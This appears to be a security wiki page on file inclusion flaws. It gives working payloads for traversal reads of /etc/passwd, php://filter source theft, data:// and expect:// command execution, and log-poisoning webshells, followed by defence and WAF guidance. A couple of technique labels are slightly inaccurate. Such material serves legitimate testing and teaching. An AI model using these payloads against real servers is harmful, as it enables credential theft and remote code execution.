---
title: Local / remote file inclusion
slug: lfi-rfi
---

> **TL;DR:** Including attacker-chosen files into server-side templates — log poisoning, php://filter chains.

## What it is
A server-side `include`, `require`, `Template.render`, `loadFile`, or equivalent takes user input as a path. LFI reads (and often executes) a file that already lives on disk; RFI fetches a remote URL and executes it. PHP's `include`, classic ASP `Server.Execute`, Node `require` with dynamic strings, Python `open()`/`Jinja2 FileSystemLoader`, Java JSP `<jsp:include>` are all candidate sinks. RFI requires the language to treat URLs as paths (PHP with `allow_url_include=On` historically) — much rarer today, but still appears.

## Preconditions / where it applies
- Input flows into a path used by an include-style API
- Path filtering allows traversal (`../`), absolute paths, wrappers, or just lacks a `realpath`+prefix check
- Read-primitive alone is enough for credential and source disclosure; RCE requires either RFI or an LFI sink that *executes* PHP/script content

## Technique
Confirm read primitive first:

```
GET /view.php?page=../../../../etc/passwd
GET /view.php?page=....//....//etc/passwd        # double-encoded traversal
GET /view.php?page=/etc/passwd%00                 # null-byte truncation (pre-PHP 5.3)
```

PHP `php://filter` for source exfil (bytes survive include):

```
?page=php://filter/convert.base64-encode/resource=config.php
```

`php://filter` RCE chain (no file upload required) — converts the include payload via a base64-decode + zlib chain so that the final stream starts with `<?php` and runs:

```
?page=php://filter/convert.base64-decode/resource=data://text/plain,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg
```

`data://` and `expect://` wrappers:

```
?page=data://text/plain,<?php system($_GET[0]);?>&0=id
?page=expect://id
```

LFI → RCE via log poisoning. Inject PHP in a User-Agent that gets written to `/var/log/apache2/access.log`, then include the log:

```
User-Agent: <?php system($_GET['c']);?>
GET /view.php?page=/var/log/apache2/access.log&c=id
```

Same trick with `/proc/self/environ`, mail spool, session files (`/var/lib/php/sessions/sess_<PHPSESSID>`).

For Node/Python templates the closest variant is [[ssti]]; for arbitrary read see [[path-traversal]].

## Detection and defence
- Never let user input pick an include target — map IDs to a hardcoded allowlist
- Disable URL wrappers: `allow_url_include=Off`, `allow_url_fopen=Off`
- `open_basedir` to confine PHP includes to one directory
- Reject any input containing `://`, `..`, null bytes, or `php://` prefix
- WAF rules for `etc/passwd`, `php://filter`, `data://`, `expect://`
- Log file paths resolved by include — diff against allowlist

## References
- [HackTricks — File inclusion](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html) — wrapper chains
- [OWASP WSTG — Testing for LFI](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) — methodology
- [Synacktiv — php://filter RCE chain](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle.html) — modern filter-chain primitives
